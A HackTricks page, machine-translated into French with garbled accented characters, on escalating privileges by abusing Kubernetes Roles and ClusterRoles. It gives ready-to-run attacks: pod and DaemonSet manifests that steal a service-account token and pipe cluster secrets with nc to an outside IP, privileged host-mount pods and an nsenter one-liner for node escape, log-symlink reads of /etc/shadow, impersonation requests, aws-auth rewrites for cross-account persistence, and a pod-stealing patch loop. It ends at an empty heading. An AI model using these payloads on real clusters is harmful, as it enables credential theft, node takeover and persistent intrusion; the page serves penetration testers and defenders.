# Abusing Roles/ClusterRoles in Kubernetes

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

Ici, vous pouvez trouver certaines configurations de Roles et ClusterRoles potentiellement dangereuses.\
N'oubliez pas que vous pouvez obtenir toutes les ressources prises en charge avec `kubectl api-resources`

## **Escalade de Privil√®ges**

Se r√©f√©rant √† l'art d'obtenir **l'acc√®s √† un principal diff√©rent** au sein du cluster **avec des privil√®ges diff√©rents** (au sein du cluster kubernetes ou vers des clouds externes) de ceux que vous avez d√©j√†, dans Kubernetes, il existe essentiellement **4 techniques principales pour escalader les privil√®ges** :

* √ätre capable de **s'imposer** √† d'autres utilisateurs/groupes/SAs avec de meilleurs privil√®ges au sein du cluster kubernetes ou vers des clouds externes
* √ätre capable de **cr√©er/patcher/ex√©cuter des pods** o√π vous pouvez **trouver ou attacher des SAs** avec de meilleurs privil√®ges au sein du cluster kubernetes ou vers des clouds externes
* √ätre capable de **lire des secrets** car les tokens des SAs sont stock√©s en tant que secrets
* √ätre capable de **s'√©chapper vers le n≈ìud** depuis un conteneur, o√π vous pouvez voler tous les secrets des conteneurs s'ex√©cutant dans le n≈ìud, les identifiants du n≈ìud et les permissions du n≈ìud au sein du cloud dans lequel il s'ex√©cute (le cas √©ch√©ant)
* Une cinqui√®me technique qui m√©rite d'√™tre mentionn√©e est la capacit√© de **faire un port-forward** dans un pod, car vous pourriez √™tre en mesure d'acc√©der √† des ressources int√©ressantes au sein de ce pod.

### Acc√©der √† n'importe quelle ressource ou verbe (Wildcard)

Le **wildcard (\*) donne la permission sur n'importe quelle ressource avec n'importe quel verbe**. Il est utilis√© par les administrateurs. √Ä l'int√©rieur d'un ClusterRole, cela signifie qu'un attaquant pourrait abuser de n'importe quel namespace dans le cluster.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### Acc√©der √† n'importe quelle ressource avec un verbe sp√©cifique

Dans RBAC, certaines permissions pr√©sentent des risques significatifs :

1. **`create`:** Accorde la capacit√© de cr√©er n'importe quelle ressource de cluster, risquant une √©l√©vation de privil√®ges.
2. **`list`:** Permet de lister toutes les ressources, pouvant potentiellement r√©v√©ler des donn√©es sensibles.
3. **`get`:** Permet d'acc√©der aux secrets des comptes de service, posant une menace pour la s√©curit√©.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Pod Create - Steal Token

Un attaquant ayant les permissions de cr√©er un pod pourrait attacher un compte de service privil√©gi√© dans le pod et voler le token pour usurper l'identit√© du compte de service. √âlevant effectivement les privil√®ges.

Exemple d'un pod qui volera le token du compte de service `bootstrap-signer` et l'enverra √† l'attaquant :
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Cr√©ation de Pod & √âvasion

Les √©l√©ments suivants indiquent tous les privil√®ges qu'un conteneur peut avoir :

* **Acc√®s privil√©gi√©** (d√©sactivation des protections et d√©finition des capacit√©s)
* **D√©sactiver les namespaces hostIPC et hostPid** qui peuvent aider √† √©lever les privil√®ges
* **D√©sactiver le namespace hostNetwork**, donnant acc√®s pour voler les privil√®ges cloud des n≈ìuds et un meilleur acc√®s aux r√©seaux
* **Monter les h√¥tes / √† l'int√©rieur du conteneur**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

Cr√©ez le pod avec :
```bash
kubectl --token $token create -f mount_root.yaml
```
One-liner de [ce tweet](https://twitter.com/mauilion/status/1129468485480751104) et avec quelques ajouts :
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
Maintenant que vous pouvez √©chapper au n≈ìud, consultez les techniques post-exploitation dans :

#### Stealth

Vous voulez probablement √™tre **plus furtif**, dans les pages suivantes, vous pouvez voir ce √† quoi vous pourriez acc√©der si vous cr√©ez un pod en n'activant que certains des privil√®ges mentionn√©s dans le mod√®le pr√©c√©dent :

* **Privileged + hostPID**
* **Privileged only**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_Vous pouvez trouver un exemple de comment cr√©er/abuser des configurations de pods privil√©gi√©s pr√©c√©dents dans_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods)

### Pod Create - Move to cloud

Si vous pouvez **cr√©er** un **pod** (et √©ventuellement un **compte de service**), vous pourriez √™tre en mesure de **obtenir des privil√®ges dans l'environnement cloud** en **assignant des r√¥les cloud √† un pod ou √† un compte de service** et ensuite y acc√©der.\
De plus, si vous pouvez cr√©er un **pod avec l'espace de noms r√©seau de l'h√¥te**, vous pouvez **voler le r√¥le IAM** de l'instance **n≈ìud**.

Pour plus d'informations, consultez :

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **Create/Patch Deployment, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Jobs and Cronjobs**

Il est possible d'abuser de ces permissions pour **cr√©er un nouveau pod** et √©tablir des privil√®ges comme dans l'exemple pr√©c√©dent.

Le yaml suivant **cr√©e un daemonset et exfiltre le token du SA** √† l'int√©rieur du pod :
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Pods Exec**

**`pods/exec`** est une ressource dans kubernetes utilis√©e pour **ex√©cuter des commandes dans un shell √† l'int√©rieur d'un pod**. Cela permet de **ex√©cuter des commandes √† l'int√©rieur des conteneurs ou d'obtenir un shell √† l'int√©rieur**.

Par cons√©quent, il est possible de **rentrer dans un pod et voler le token du SA**, ou d'entrer dans un pod privil√©gi√©, s'√©chapper vers le n≈ìud et voler tous les tokens des pods dans le n≈ìud et (ab)user du n≈ìud :
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### port-forward

Cette permission permet de **transf√©rer un port local vers un port dans le pod sp√©cifi√©**. Cela est destin√© √† faciliter le d√©bogage des applications s'ex√©cutant √† l'int√©rieur d'un pod, mais un attaquant pourrait en abuser pour acc√©der √† des applications int√©ressantes (comme des bases de donn√©es) ou vuln√©rables (webs ?) √† l'int√©rieur d'un pod :
```
kubectl port-forward pod/mypod 5000:5000
```
### H√¥tes √âcrivable /var/log/ √âvasion

Comme [**indiqu√© dans cette recherche**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), si vous pouvez acc√©der ou cr√©er un pod avec le **r√©pertoire `/var/log/` des h√¥tes mont√©** dessus, vous pouvez **√©chapper du conteneur**.\
C'est essentiellement parce que lorsque le **Kube-API essaie d'obtenir les logs** d'un conteneur (en utilisant `kubectl logs <pod>`), il **demande le fichier `0.log`** du pod en utilisant le point de terminaison `/logs/` du service **Kubelet**.\
Le service Kubelet expose le point de terminaison `/logs/` qui expose essentiellement **le syst√®me de fichiers `/var/log` du conteneur**.

Par cons√©quent, un attaquant avec **acc√®s en √©criture dans le dossier /var/log/** du conteneur pourrait abuser de ce comportement de 2 mani√®res :

* Modifier le fichier `0.log` de son conteneur (g√©n√©ralement situ√© dans `/var/logs/pods/namespace_pod_uid/container/0.log`) pour en faire un **lien symbolique pointant vers `/etc/shadow`** par exemple. Ensuite, vous pourrez exfiltrer le fichier shadow des h√¥tes en faisant :
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* Si l'attaquant contr√¥le un principal avec les **permissions de lire `nodes/log`**, il peut simplement cr√©er un **symlink** dans `/host-mounted/var/log/sym` vers `/` et lorsqu'il **acc√®de √† `https://<gateway>:10250/logs/sym/`, il listera le syst√®me de fichiers racine** de l'h√¥te (changer le symlink peut fournir un acc√®s √† des fichiers).
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**Un laboratoire et un exploit automatis√© peuvent √™tre trouv√©s dans** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### Contournement de la protection readOnly <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Si vous avez la chance et que la capacit√© hautement privil√©gi√©e `CAP_SYS_ADMIN` est disponible, vous pouvez simplement remonter le dossier en rw :
```bash
mount -o rw,remount /hostlogs/
```
#### Contournement de la protection hostPath en lecture seule <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Comme indiqu√© dans [**cette recherche**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), il est possible de contourner la protection :
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
Ce qui √©tait cens√© pr√©venir les √©chappements comme les pr√©c√©dents en utilisant, au lieu d'un montage hostPath, un PersistentVolume et un PersistentVolumeClaim pour monter un dossier h√¥te dans le conteneur avec un acc√®s en √©criture :
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **Impersonation de comptes privil√©gi√©s**

Avec un privil√®ge de [**simulation d'utilisateur**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation), un attaquant pourrait se faire passer pour un compte privil√©gi√©.

Il suffit d'utiliser le param√®tre `--as=<username>` dans la commande `kubectl` pour se faire passer pour un utilisateur, ou `--as-group=<group>` pour se faire passer pour un groupe :
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
Ou utilisez l'API REST :
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Listing Secrets

La permission de **lister les secrets pourrait permettre √† un attaquant de r√©ellement lire les secrets** en acc√©dant au point de terminaison de l'API REST :
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Lecture d'un secret ‚Äì force brute des identifiants de jeton

Bien qu'un attaquant en possession d'un jeton avec des permissions de lecture n√©cessite le nom exact du secret pour l'utiliser, contrairement au privil√®ge plus large de _**lister les secrets**_, il existe encore des vuln√©rabilit√©s. Les comptes de service par d√©faut dans le syst√®me peuvent √™tre √©num√©r√©s, chacun √©tant associ√© √† un secret. Ces secrets ont une structure de nom : un pr√©fixe statique suivi d'un jeton alphanum√©rique al√©atoire de cinq caract√®res (√† l'exclusion de certains caract√®res) selon le [code source](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83).

Le jeton est g√©n√©r√© √† partir d'un ensemble limit√© de 27 caract√®res (`bcdfghjklmnpqrstvwxz2456789`), plut√¥t que de la plage alphanum√©rique compl√®te. Cette limitation r√©duit le nombre total de combinaisons possibles √† 14 348 907 (27^5). Par cons√©quent, un attaquant pourrait raisonnablement ex√©cuter une attaque par force brute pour d√©duire le jeton en quelques heures, ce qui pourrait entra√Æner une √©l√©vation de privil√®ges en acc√©dant √† des comptes de service sensibles.

### Demandes de signature de certificat

Si vous avez les verbes **`create`** dans la ressource `certificatesigningrequests` (ou au moins dans `certificatesigningrequests/nodeClient`). Vous pouvez **cr√©er** un nouveau CeSR d'un **nouveau n≈ìud.**

Selon la [documentation, il est possible d'approuver automatiquement ces demandes](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), donc dans ce cas, vous **n'avez pas besoin de permissions suppl√©mentaires**. Sinon, vous devrez √™tre en mesure d'approuver la demande, ce qui signifie une mise √† jour dans `certificatesigningrequests/approval` et `approve` dans `signers` avec resourceName `<signerNameDomain>/<signerNamePath>` ou `<signerNameDomain>/*`

Un **exemple de r√¥le** avec toutes les permissions requises est :
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
Donc, avec le nouveau CSR de n≈ìud approuv√©, vous pouvez **abuser** des permissions sp√©ciales des n≈ìuds pour **voler des secrets** et **escalader des privil√®ges**.

Dans [**ce post**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) et [**celui-ci**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/), la configuration de GKE K8s TLS Bootstrap est configur√©e avec **signature automatique** et elle est abus√©e pour g√©n√©rer des identifiants d'un nouveau n≈ìud K8s et ensuite abuser de ceux-ci pour escalader des privil√®ges en volant des secrets.\
Si vous **avez les privil√®ges mentionn√©s, vous pourriez faire la m√™me chose**. Notez que le premier exemple contourne l'erreur emp√™chant un nouveau n≈ìud d'acc√©der aux secrets √† l'int√©rieur des conteneurs parce qu'un **n≈ìud ne peut acc√©der qu'aux secrets des conteneurs mont√©s sur lui.**

La fa√ßon de contourner cela est simplement de **cr√©er des identifiants de n≈ìud pour le nom du n≈ìud o√π le conteneur avec les secrets int√©ressants est mont√©** (mais v√©rifiez juste comment le faire dans le premier post) :
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

Les principaux qui peuvent modifier **`configmaps`** dans l'espace de noms kube-system sur les clusters EKS (doivent √™tre dans AWS) peuvent obtenir des privil√®ges d'administrateur de cluster en √©crasant le **aws-auth** configmap.\
Les verbes n√©cessaires sont **`update`** et **`patch`**, ou **`create`** si le configmap n'a pas √©t√© cr√©√© :

{% code overflow="wrap" %}
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
Vous pouvez utiliser **`aws-auth`** pour **la persistance** en donnant acc√®s √† des utilisateurs d'**autres comptes**.

Cependant, `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **ne fonctionne pas depuis un compte diff√©rent**. Mais en r√©alit√©, `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` fonctionne si vous mettez l'ARN du cluster au lieu de juste le nom.\
Pour faire fonctionner `kubectl`, assurez-vous simplement de **configurer** le **kubeconfig de la victime** et dans les arguments d'ex√©cution aws, ajoutez `--profile other_account_role` afin que kubectl utilise le profil de l'autre compte pour obtenir le token et contacter AWS.
{% endhint %}

### Escalade dans GKE

Il existe **2 fa√ßons d'assigner des permissions K8s aux principaux GCP**. Dans tous les cas, le principal a √©galement besoin de la permission **`container.clusters.get`** pour pouvoir rassembler des informations d'identification pour acc√©der au cluster, sinon vous devrez **g√©n√©rer votre propre fichier de configuration kubectl** (suivez le lien suivant).

{% hint style="warning" %}
Lorsqu'il communique avec le point de terminaison API K8s, le **token d'authentification GCP sera envoy√©**. Ensuite, GCP, via le point de terminaison API K8s, v√©rifiera d'abord si le **principal** (par e-mail) **a un acc√®s √† l'int√©rieur du cluster**, puis il v√©rifiera s'il a **un acc√®s via GCP IAM**.\
Si **l'un** de ces √©l√©ments est **vrai**, il sera **r√©pondu**. Sinon, une **erreur** sugg√©rant de donner **des permissions via GCP IAM** sera donn√©e.
{% endhint %}

Ensuite, la premi√®re m√©thode consiste √† utiliser **GCP IAM**, les permissions K8s ont leurs **permissions GCP IAM √©quivalentes**, et si le principal les a, il pourra les utiliser.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

La deuxi√®me m√©thode consiste √† **assigner des permissions K8s √† l'int√©rieur du cluster** en identifiant l'utilisateur par son **e-mail** (comptes de service GCP inclus).

### Cr√©er un token de service

Les principaux qui peuvent **cr√©er des TokenRequests** (`serviceaccounts/token`) lorsqu'ils communiquent avec le point de terminaison API K8s SAs (info de [**ici**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token_request.rego)).

### ephemeralcontainers

Les principaux qui peuvent **`update`** ou **`patch`** **`pods/ephemeralcontainers`** peuvent obtenir **une ex√©cution de code sur d'autres pods**, et potentiellement **s'√©chapper** vers leur n≈ìud en ajoutant un conteneur √©ph√©m√®re avec un securityContext privil√©gi√©.

### ValidatingWebhookConfigurations ou MutatingWebhookConfigurations

Les principaux ayant l'un des verbes `create`, `update` ou `patch` sur `validatingwebhookconfigurations` ou `mutatingwebhookconfigurations` pourraient √™tre en mesure de **cr√©er l'une de ces configurations de webhook** afin de pouvoir **escalader les privil√®ges**.

Pour un [exemple de `mutatingwebhookconfigurations`, consultez cette section de ce post](./#malicious-admission-controller).

### Escalader

Comme vous pouvez le lire dans la section suivante : [**Pr√©vention int√©gr√©e de l'escalade de privil√®ges**](./#built-in-privileged-escalation-prevention), un principal ne peut ni mettre √† jour ni cr√©er des r√¥les ou des clusterroles sans avoir lui-m√™me ces nouvelles permissions. Sauf s'il a le **verbe `escalate`** sur **`roles`** ou **`clusterroles`**.\
Alors il peut mettre √† jour/cr√©er de nouveaux r√¥les, clusterroles avec de meilleures permissions que celles qu'il a.

### Proxy des n≈ìuds

Les principaux ayant acc√®s √† la sous-ressource **`nodes/proxy`** peuvent **ex√©cuter du code sur des pods** via l'API Kubelet (selon [**ceci**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes_proxy.rego)). Plus d'informations sur l'authentification Kubelet sur cette page :

{% content-ref url="../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

Vous avez un exemple de comment obtenir [**RCE en parlant autoris√© √† une API Kubelet ici**](../pentesting-kubernetes-services/#kubelet-rce).

### Supprimer des pods + n≈ìuds non planifiables

Les principaux qui peuvent **supprimer des pods** (verbe `delete` sur la ressource `pods`), ou **√©vincer des pods** (verbe `create` sur la ressource `pods/eviction`), ou **changer le statut des pods** (acc√®s √† `pods/status`) et peuvent **rendre d'autres n≈ìuds non planifiables** (acc√®s √† `nodes/status`) ou **supprimer des n≈ìuds** (verbe `delete` sur la ressource `nodes`) et ont le contr√¥le sur un pod, pourraient **voler des pods d'autres n≈ìuds** afin qu'ils soient **ex√©cut√©s** dans le **n≈ìud compromis** et que l'attaquant puisse **voler les tokens** de ces pods.

{% code overflow="wrap" %}
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### √âtat des services (CVE-2020-8554)

Les principaux qui peuvent **modifier** **`services/status`** peuvent d√©finir le champ `status.loadBalancer.ingress.ip` pour exploiter le **CVE-2020-8554 non corrig√©** et lancer des **attaques MiTM contre le cluster**. La plupart des att√©nuations pour le CVE-2020-8554 ne pr√©viennent que les services ExternalIP (selon [**ceci**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify_service_status_cve_2020_8554.rego)).

### √âtat des n≈ìuds et des pods

Les principaux ayant des permissions **`update`** ou **`patch`** sur `nodes/status` ou `pods/status`, pourraient modifier des √©tiquettes pour affecter les contraintes de planification appliqu√©es.

## Pr√©vention int√©gr√©e de l'escalade de privil√®ges

Kubernetes dispose d'un [m√©canisme int√©gr√©](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) pour pr√©venir l'escalade de privil√®ges.

Ce syst√®me garantit que **les utilisateurs ne peuvent pas √©lever leurs privil√®ges en modifiant des r√¥les ou des liaisons de r√¥les**. L'application de cette r√®gle se fait au niveau de l'API, fournissant une protection m√™me lorsque l'autorisation RBAC est inactive.

La r√®gle stipule qu'un **utilisateur ne peut cr√©er ou mettre √† jour un r√¥le que s'il poss√®de toutes les permissions que le r√¥le comprend**. De plus, la port√©e des permissions existantes de l'utilisateur doit correspondre √† celle du r√¥le qu'il tente de cr√©er ou de modifier : soit √† l'√©chelle du cluster pour les ClusterRoles, soit confin√©e au m√™me espace de noms (ou √† l'√©chelle du cluster) pour les Roles.

{% hint style="warning" %}
Il existe une exception √† la r√®gle pr√©c√©dente. Si un principal a le **verbe `escalate`** sur **`roles`** ou **`clusterroles`**, il peut augmenter les privil√®ges des r√¥les et des clusterroles m√™me sans avoir les permissions lui-m√™me.
{% endhint %}

### **Obtenir & Patch RoleBindings/ClusterRoleBindings**

{% hint style="danger" %}
**Apparemment, cette technique fonctionnait auparavant, mais selon mes tests, elle ne fonctionne plus pour la m√™me raison expliqu√©e dans la section pr√©c√©dente. Vous ne pouvez pas cr√©er/modifier un rolebinding pour vous donner ou donner √† un autre SA des privil√®ges si vous ne les avez pas d√©j√†.**
{% endhint %}

Le privil√®ge de cr√©er des Rolebindings permet √† un utilisateur de **lier des r√¥les √† un compte de service**. Ce privil√®ge peut potentiellement conduire √† une escalade de privil√®ges car il **permet √† l'utilisateur de lier des privil√®ges d'administrateur √† un compte de service compromis.**

## Autres attaques

### Application de proxy sidecar

Par d√©faut, il n'y a pas de cryptage dans la communication entre les pods. Authentification mutuelle, bidirectionnelle, pod √† pod.

#### Cr√©er une application de proxy sidecar <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

Cr√©ez votre .yaml
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
Modifiez votre .yaml et ajoutez les lignes d√©comment√©es :
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
Voir les journaux du proxy :
```bash
kubectl logs app -C proxy
```
Plus d'infos sur : [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### Contr√¥leur d'admission malveillant

Un contr√¥leur d'admission **intercepte les requ√™tes au serveur API Kubernetes** avant la persistance de l'objet, mais **apr√®s que la requ√™te soit authentifi√©e** **et autoris√©e**.

Si un attaquant parvient d'une mani√®re ou d'une autre √† **injecter un contr√¥leur d'admission de mutation**, il pourra **modifier des requ√™tes d√©j√† authentifi√©es**. Cela peut potentiellement permettre une √©l√©vation de privil√®ges, et plus g√©n√©ralement persister dans le cluster.

**Exemple de** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers) :
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
V√©rifiez l'√©tat pour voir s'il est pr√™t :
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

Ensuite, d√©ployez un nouveau pod :
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
Lorsque vous voyez l'erreur `ErrImagePull`, v√©rifiez le nom de l'image avec l'une des requ√™tes suivantes :
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

Comme vous pouvez le voir dans l'image ci-dessus, nous avons essay√© d'ex√©cuter l'image `nginx`, mais l'image finale ex√©cut√©e est `rewanthtammana/malicious-image`. Que s'est-il pass√© !!?

#### Technicalities <a href="#heading-technicalities" id="heading-technicalities"></a>

